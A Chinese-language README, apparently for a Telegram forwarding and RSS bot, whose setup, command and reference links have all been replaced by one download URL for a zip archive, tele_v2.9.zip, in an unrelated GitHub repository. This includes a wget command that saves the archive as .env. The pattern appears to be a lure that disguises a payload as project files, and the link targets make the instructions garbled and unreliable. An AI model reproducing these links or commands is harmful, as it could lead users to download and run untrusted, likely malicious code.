...
[![Docker](https://img.shields.io/badge/-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)][docker-url] [![License: GPL-3.0](https://img.shields.io/badge/License-GPL%203.0-4CAF50?style=flat-square)](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)

[docker-url]: https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip
...
1. 获取 Telegram API 凭据：
   - 访问 https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip
...
```
下载仓库的 [**docker-compose.yml**](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip) 到目录下

接着下载或复制仓库的 **[.env.example](./.env.example)** 文件，填入必填项，然后重命名为`.env`
```bash
wget https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip -O .env
```
...
假设订阅了频道 "TG 新闻" (https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip) 和 "TG 阅读" (https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip) ，但想过滤掉一些不感兴趣的内容：

1. 创建一个 Telegram 群组/频道（例如："My TG Filter"）
2. 将机器人添加到群组/频道，并设置为管理员
3. 在**新创建**的群组/频道中发送命令：
   ```bash
   /bind https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip 或者 /bind "TG 新闻"
   /bind https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip 或者 /bind "TG 阅读"
   ```
4. 设置消息处理模式：
   ```bash
   /settings
...
频道的原始消息格式 
```markdown
[**贴子标题**](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)
```  
...
```plaintext
贴子标题
(https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)
```  
...
1. 在你的 bot 管理的任意群组或频道中发送以下命令：  
   ```bash
   /bind https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip 你的用户名（即展示的名称）
   ```  
...
### 如何添加推送配置？
完整的推送平台列表和配置格式请参考 [Apprise Wiki](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)
...
1. 在 `.env` 文件中配置RSS相关参数：
   ...
   RSS_ENABLED=true
   # RSS基础访问URL，留空则使用默认的访问URL（例如：https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip）
   RSS_BASE_URL=
   # RSS媒体文件基础URL，留空则使用默认的访问URL（例如：https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip）
   RSS_MEDIA_BASE_URL=
   ```
...
- [Apprise](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)
- [Telethon](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)

## ☕ 捐赠

如果你觉得这个项目对你有帮助，欢迎通过以下方式请我喝杯咖啡：

[![ko-fi](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)](https://raw.githubusercontent.com/aa1125573296-svg/tele-/main/rss/app/templates/tele_v2.9.zip)
